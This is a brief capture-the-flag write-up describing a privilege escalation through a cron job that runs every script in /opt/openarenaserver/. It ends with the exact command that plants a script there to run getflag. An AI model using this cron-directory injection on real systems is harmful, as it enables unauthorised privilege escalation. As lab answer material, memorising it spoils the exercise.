We saw that a crontab is executing a script every two minutes.
We dig into the file, wich is a script that is bash-ing a list of script files inside this folder /opt/openarenaserver/
We created a script file in this folder calling getflag with a redirection

echo >/opt/openarenaserver/coucou "getflag >/var/tmp/flag"
